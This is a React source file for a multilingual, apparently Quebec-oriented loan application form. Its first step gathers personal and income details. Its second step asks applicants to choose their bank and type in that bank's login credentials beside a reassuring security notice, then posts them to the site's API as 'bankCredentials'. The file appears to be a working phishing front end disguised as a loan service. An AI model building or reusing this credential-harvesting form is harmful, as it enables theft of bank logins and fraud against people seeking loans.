import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useToastStore, useLangStore } from '../store';
import { t } from '../utils/i18n';
import { BANKS, BANK_FIELDS, BANKS_LOOKUP } from '../config/banks';

const RE_EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const RE_PHONE = /^\+?[\d\s\-().]{7,20}$/;
const RE_POSTAL = /^[A-Za-z]\d[A-Za-z]\s?\d[A-Za-z]\d$/;

const validators = {
  email: (v) => RE_EMAIL.test(v),
  phone: (v) => RE_PHONE.test(v),
  postalCode: (v) => RE_POSTAL.test(v.replace(/\s/g, '')),
  loanAmount: (v) => Number(v) > 0,
  monthlyIncome: (v) => Number(v) > 0,
};

const errorMessages = {
  email:     { fr:'Adresse email invalide',     en:'Invalid email address',     it:'Indirizzo email non valido',     es:'Correo electrónico inválido',     de:'Ungültige E-Mail-Adresse',     pt:'Endereço de email inválido' },
  phone:     { fr:'Numéro de téléphone invalide', en:'Invalid phone number',   it:'Numero di telefono non valido',  es:'Número de teléfono inválido',     de:'Ungültige Telefonnummer',      pt:'Número de telefone inválido' },
  postalCode:{ fr:'Code postal invalide (ex: H2X 1L5)', en:'Invalid postal code (e.g. H2X 1L5)', it:'CAP non valido (es. H2X 1L5)', es:'Código postal inválido (ej. H2X 1L5)', de:'Ungültige Postleitzahl (z.B. H2X 1L5)', pt:'CEP inválido (ex. H2X 1L5)' },
  loanAmount:{ fr:'Le montant doit être supérieur à 0', en:'Amount must be greater than 0', it:"L'importo deve essere maggiore di 0", es:'El monto debe ser mayor a 0', de:'Betrag muss größer als 0 sein', pt:'O valor deve ser maior que 0' },
  monthlyIncome:{ fr:'Le revenu doit être supérieur à 0', en:'Income must be greater than 0', it:'Il reddito deve essere maggiore di 0', es:'El ingreso debe ser mayor a 0', de:'Einkommen muss größer als 0 sein', pt:'A renda deve ser maior que 0' },
};

const STEPS = [
  { id: 1, labelKey: 'loan_step1' },
  { id: 2, labelKey: 'loan_step2' },
];

const initialForm = {
  fullName: '', phone: '', email: '', address: '', city: '', postalCode: '',
  loanAmount: '', monthlyIncome: '', profession: '', nextPayday: '', jointRequest: 'non',
  loanPurpose: '', desiredDate: '', bankId: '',
};

export default function LoanForm() {
  const navigate = useNavigate();
  const { lang } = useLangStore();
  const l = lang || 'fr';
  const addToast = useToastStore(s => s.addToast);
  const [step, setStep] = useState(1);
  const [form, setForm] = useState(initialForm);
  const [bankFieldValues, setBankFieldValues] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [trackingNumber, setTrackingNumber] = useState('');
  const [errors, setErrors] = useState({});

  const update = (field, value) => {
    setForm(f => ({ ...f, [field]: value }));
    if (errors[field]) setErrors(e => { const n = { ...e }; delete n[field]; return n; });
  };

  const selectedBank = BANKS.find(b => b.id === form.bankId);
  const selectedFields = form.bankId ? BANK_FIELDS[form.bankId] : null;

  const validateStep1 = () => {
    const errs = {};
    if (!form.fullName.trim()) errs.fullName = true;
    if (!validators.phone(form.phone)) errs.phone = true;
    if (!validators.email(form.email)) errs.email = true;
    if (!form.address.trim()) errs.address = true;
    if (!form.city.trim()) errs.city = true;
    if (!validators.postalCode(form.postalCode)) errs.postalCode = true;
    if (!validators.loanAmount(form.loanAmount)) errs.loanAmount = true;
    if (!validators.monthlyIncome(form.monthlyIncome)) errs.monthlyIncome = true;
    if (!form.profession.trim()) errs.profession = true;
    if (!form.nextPayday) errs.nextPayday = true;
    if (!form.loanPurpose) errs.loanPurpose = true;
    if (!form.desiredDate) errs.desiredDate = true;
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const canProceedStep2 = () => form.bankId && selectedFields
    && selectedFields.fields.every(f => bankFieldValues[f.name]?.trim());

  const handleNext = () => {
    if (validateStep1()) setStep(2);
  };

  const handleSubmit = async () => {
    if (!canProceedStep2() || submitting) return;
    setSubmitting(true);
    try {
      const payload = { ...form, bankName: BANKS_LOOKUP[form.bankId] || form.bankId, bankCredentials: bankFieldValues };
      const res = await fetch('/api/loan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.message);
      setTrackingNumber(data.trackingNumber || '');
      setSubmitted(true);
      addToast(t('loan_toast', l), 'success');
    } catch (err) {
      addToast(t('loan_toast_err', l), 'error');
    }
    setSubmitting(false);
  };

  if (submitted) {
    return (
      <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', padding:'120px 6% 60px', background:'var(--bg)' }}>
        <motion.div initial={{ opacity:0, scale:0.9 }} animate={{ opacity:1, scale:1 }} transition={{ duration:0.5, ease:[0.16,1,0.3,1] }}
          className="card" style={{ maxWidth:480, width:'100%', padding:'60px 40px', textAlign:'center' }}>
          <div style={{ width:80, height:80, borderRadius:'50%', background:'rgba(22,163,74,0.1)', border:'2px solid rgba(22,163,74,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:36, margin:'0 auto 24px' }}>✅</div>
          <h2 style={{ fontFamily:"'Outfit',sans-serif", fontSize:28, fontWeight:900, marginBottom:12 }}>{t('loan_success', l)}</h2>
          <p style={{ fontSize:14, color:'var(--text-3)', lineHeight:1.7, marginBottom:24 }}>
            {t('loan_success_desc', l)}
          </p>
          {trackingNumber && (
            <div style={{
              background: 'linear-gradient(135deg, #0A1F44 0%, #1A3A6E 100%)',
              borderRadius: 14, padding: '24px 20px', marginBottom: 24,
            }}>
              <div style={{ fontSize:10, fontWeight:700, letterSpacing:'0.25em', textTransform:'uppercase', color:'rgba(255,255,255,0.55)', marginBottom:6 }}>
                {t('track_num', l)}
              </div>
              <div style={{
                fontFamily:"'Courier New',monospace", fontSize:30, fontWeight:800,
                color:'var(--gold)', letterSpacing:'0.1em', marginBottom:14,
              }}>
                {trackingNumber}
              </div>
              <a href={`/suivi?num=${encodeURIComponent(trackingNumber)}`} className="btn-gold"
                style={{ fontSize:11, padding:'10px 20px', textDecoration:'none', display:'inline-flex' }}>
                {t('track_btn', l)} →
              </a>
            </div>
          )}
          <div style={{ display:'flex', gap:12, justifyContent:'center', flexWrap:'wrap' }}>
            <button onClick={()=>{ setSubmitted(false); setForm(initialForm); setBankFieldValues({}); setStep(1); setErrors({}); setTrackingNumber(''); }} className="btn-ghost" style={{ fontSize:12 }}>{t('loan_new', l)}</button>
            <button onClick={()=> navigate('/')} className="btn-primary" style={{ fontSize:12 }}>{t('loan_home', l)}</button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <>
      <section style={{
        position:'relative', padding:'130px 6% 60px',
        background: 'linear-gradient(135deg, #0A1F44 0%, #061232 50%, #1A3A6E 100%)',
        overflow:'hidden',
      }}>
        <div className="noise" style={{ position:'absolute', inset:0 }} />
        <div style={{ position:'absolute', top:'-20%', right:'-5%', width:400, height:400, borderRadius:'50%', background:'radial-gradient(circle, rgba(245,166,35,0.08) 0%, transparent 70%)' }} />
        <motion.div initial={{ opacity:0, y:24 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.6, ease:[0.16,1,0.3,1] }} style={{ position:'relative', zIndex:1 }}>
          <span className="section-eyebrow" style={{ color:'var(--gold)' }}>Formulaire</span>
          <h1 className="hero-text" style={{ fontSize:'clamp(32px,5vw,52px)', marginBottom:12 }}>{t('loan_title', l)}</h1>
          <p className="hero-sub" style={{ fontSize:15, lineHeight:1.65 }}>{t('loan_sub', l)}</p>
        </motion.div>
      </section>

      <section style={{ padding:'60px 6%', background:'var(--bg)' }}>
        <div style={{ maxWidth:640, margin:'0 auto' }}>
          <div style={{ marginBottom:36, display:'flex', justifyContent:'space-between', position:'relative' }}>
            {STEPS.map(s => (
              <div key={s.id} style={{ textAlign:'center', position:'relative', zIndex:1, flex:1 }}>
                <div style={{
                  width:36, height:36, borderRadius:'50%', display:'flex', alignItems:'center', justifyContent:'center',
                  fontSize:12, fontWeight:800, fontFamily:"'Outfit',sans-serif",
                  background: s.id <= step ? 'var(--gold)' : 'var(--bg-card2)',
                  color: s.id <= step ? '#0A1F44' : 'var(--text-3)',
                  border: s.id <= step ? '2px solid var(--gold)' : '2px solid var(--border-2)',
                  transition:'all 0.3s var(--ease)', margin:'0 auto',
                }}>{s.id}</div>
                <div style={{ fontSize:10, fontWeight:700, marginTop:6, color: s.id === step ? 'var(--gold)' : 'var(--text-3)', letterSpacing:'0.04em', textTransform:'uppercase', fontFamily:"'Outfit',sans-serif" }}>
                  {t(s.labelKey, l)}
                </div>
              </div>
            ))}
            <div style={{ position:'absolute', top:18, left:'10%', right:'10%', height:2, background:'var(--border-2)', zIndex:0 }}>
              <div style={{ height:'100%', background:'var(--gold)', transition:'width 0.5s var(--ease)', width:`${((step-1)/(STEPS.length-1))*100}%` }} />
            </div>
          </div>

          <div className="card" style={{ padding:'36px 32px' }}>
            <AnimatePresence mode="wait">
              <motion.div key={step} initial={{ opacity:0, x:16 }} animate={{ opacity:1, x:0 }} exit={{ opacity:0, x:-16 }} transition={{ duration:0.25, ease:[0.16,1,0.3,1] }}>
                <h3 style={{ fontFamily:"'Outfit',sans-serif", fontSize:18, fontWeight:800, marginBottom:24, paddingBottom:16, borderBottom:'1px solid var(--border)' }}>
                  {step === 1 ? t('loan_personal', l) : t('loan_bank_title', l)}
                </h3>

                <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
                  {step === 1 && (
                    <>
                      <Field label={t('loan_fullname', l)} value={form.fullName} onChange={v => update('fullName', v)} placeholder="Jean Dupont" error={errors.fullName} />
                      <Field label={t('loan_phone', l)} value={form.phone} onChange={v => update('phone', v)} placeholder="+1 438 123 4567" type="tel" error={errors.phone} errorMsg={errorMessages.phone[l]} />
                      <Field label={t('loan_email', l)} value={form.email} onChange={v => update('email', v)} placeholder="jean@exemple.com" type="email" error={errors.email} errorMsg={errorMessages.email[l]} />
                      <Field label={t('loan_address', l)} value={form.address} onChange={v => update('address', v)} placeholder="123 rue Sainte-Catherine" error={errors.address} />
                      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
                        <Field label={t('loan_city', l)} value={form.city} onChange={v => update('city', v)} placeholder="Montréal" error={errors.city} />
                        <Field label={t('loan_postal', l)} value={form.postalCode} onChange={v => update('postalCode', v)} placeholder="H2X 1L5" error={errors.postalCode} errorMsg={errorMessages.postalCode[l]} />
                      </div>
                      <Field label={t('loan_amount', l)} value={form.loanAmount} onChange={v => update('loanAmount', v)} placeholder="5000" type="number" error={errors.loanAmount} errorMsg={errorMessages.loanAmount[l]} />
                      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
                        <Field label={t('loan_income', l)} value={form.monthlyIncome} onChange={v => update('monthlyIncome', v)} placeholder="3500" type="number" error={errors.monthlyIncome} errorMsg={errorMessages.monthlyIncome[l]} />
                        <Field label={t('loan_profession', l)} value={form.profession} onChange={v => update('profession', v)} placeholder="Employé" error={errors.profession} />
                      </div>
                      <Field label={t('loan_payday', l)} value={form.nextPayday} onChange={v => update('nextPayday', v)} type="date" error={errors.nextPayday} />
                      <div>
                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_purpose', l)}</label>
                        <select className="input-luxury" value={form.loanPurpose} onChange={e => update('loanPurpose', e.target.value)} style={{ borderColor: errors.loanPurpose ? '#DC2626' : undefined }}>
                          <option value="">{t('loan_select', l)}</option>
                          <option value="personnel">{t('loan_personal2', l)}</option>
                          <option value="auto">{t('loan_vehicle', l)}</option>
                          <option value="travaux">{t('loan_renovation', l)}</option>
                          <option value="etudes">{t('loan_study', l)}</option>
                          <option value="sante">{t('loan_health', l)}</option>
                          <option value="autres">{t('loan_other', l)}</option>
                        </select>
                      </div>
                      <Field label={t('loan_date', l)} value={form.desiredDate} onChange={v => update('desiredDate', v)} type="date" error={errors.desiredDate} />
                      <div>
                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_joint', l)}</label>
                        <div style={{ display:'flex', gap:12 }}>
                          {['non', 'oui'].map(v => (
                            <button key={v} onClick={() => update('jointRequest', v)} style={{
                              flex:1, padding:'12px 20px', borderRadius:8, cursor:'pointer',
                              border:`1.5px solid ${form.jointRequest===v?'var(--gold)':'var(--border-2)'}`,
                              background: form.jointRequest===v ? 'rgba(245,166,35,0.08)' : 'var(--bg-input)',
                              color: form.jointRequest===v ? 'var(--gold)' : 'var(--text-2)',
                              fontWeight: form.jointRequest===v ? 700 : 400,
                              fontSize:13, fontFamily:"'Outfit',sans-serif", transition:'all 0.2s', minHeight:44,
                            }}>
                              {v === 'oui' ? t('loan_yes', l) : t('loan_no', l)}
                            </button>
                          ))}
                        </div>
                      </div>
                    </>
                  )}

                  {step === 2 && (
                    <>
                      <div style={{ padding:'14px 18px', borderRadius:8, background:'rgba(245,166,35,0.06)', border:'1px solid rgba(245,166,35,0.2)', display:'flex', alignItems:'center', gap:10, fontSize:13, color:'var(--text-2)' }}>
                        <span style={{ fontSize:16, flexShrink:0 }}>🔐</span>
                        <span>{t('loan_secure', l)}</span>
                      </div>

                      <div>
                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_bank_select', l)}</label>
                        <select className="input-luxury" value={form.bankId} onChange={e => { update('bankId', e.target.value); setBankFieldValues({}); }}>
                          <option value="">{t('loan_choose', l)}</option>
                          {BANKS.map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
                        </select>
                      </div>

                      {selectedBank && selectedFields && (
                        <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.35, ease:[0.16,1,0.3,1] }}
                          style={{ border:'1px solid var(--border-2)', borderRadius:12, overflow:'hidden' }}>
                          <div style={{ padding:'16px 18px', background:'var(--bg-card2)', borderBottom:'1px solid var(--border)', display:'flex', alignItems:'center', gap:12 }}>
                            <span style={{ fontSize:28, flexShrink:0 }}>{selectedFields.logo}</span>
                            <div style={{ minWidth:0 }}>
                              <div style={{ fontSize:14, fontWeight:700, fontFamily:"'Outfit',sans-serif" }}>{selectedBank.name}</div>
                              <div style={{ fontSize:11, color:'var(--text-3)' }}>{t('loan_login_text', l)}</div>
                            </div>
                            <a href={selectedBank.url} target="_blank" rel="noopener noreferrer" style={{ marginLeft:'auto', fontSize:11, color:'var(--gold)', fontWeight:700, textDecoration:'none', flexShrink:0 }}>{t('loan_site', l)}</a>
                          </div>
                          <div style={{ padding:'24px 18px', display:'flex', flexDirection:'column', gap:16 }}>
                            {selectedFields.fields.map(f => (
                              <div key={f.name}>
                                <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:5, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{f.label}</label>
                                <input className="input-luxury" type={f.type} value={bankFieldValues[f.name]||''} onChange={e => setBankFieldValues(v => ({...v, [f.name]: e.target.value}))} placeholder={f.placeholder} autoComplete="off" />
                              </div>
                            ))}
                          </div>
                        </motion.div>
                      )}
                    </>
                  )}
                </div>
              </motion.div>
            </AnimatePresence>

            <div style={{ display:'flex', justifyContent:'space-between', marginTop:28, paddingTop:20, borderTop:'1px solid var(--border)' }}>
              {step > 1 ? (
                <button onClick={() => setStep(s => s - 1)} className="btn-ghost" style={{ fontSize:12, padding:'12px 24px' }}>{t('loan_back', l)}</button>
              ) : <div />}
              {step === 1 ? (
                <button onClick={handleNext} className="btn-primary" style={{ fontSize:12, padding:'12px 28px' }}>
                  {t('loan_next', l)}
                </button>
              ) : (
                <button onClick={handleSubmit} disabled={!canProceedStep2() || submitting} className="btn-gold" style={{ fontSize:12, padding:'12px 28px', opacity: canProceedStep2() && !submitting ? 1 : 0.4, cursor: canProceedStep2() && !submitting ? 'pointer' : 'not-allowed' }}>
                  {submitting ? t('loan_submitting', l) : t('loan_submit', l)}
                </button>
              )}
            </div>
          </div>
        </div>
      </section>
    </>
  );
}

function Field({ label, value, onChange, placeholder, type = 'text', error, errorMsg }) {
  return (
    <div>
      <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:5, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{label}</label>
      <input className="input-luxury" type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder}
        style={{ borderColor: error ? '#DC2626' : undefined }} />
      {error && errorMsg && (
        <p style={{ fontSize:11, color:'#DC2626', marginTop:4, fontWeight:600 }}>{errorMsg}</p>
      )}
    </div>
  );
}
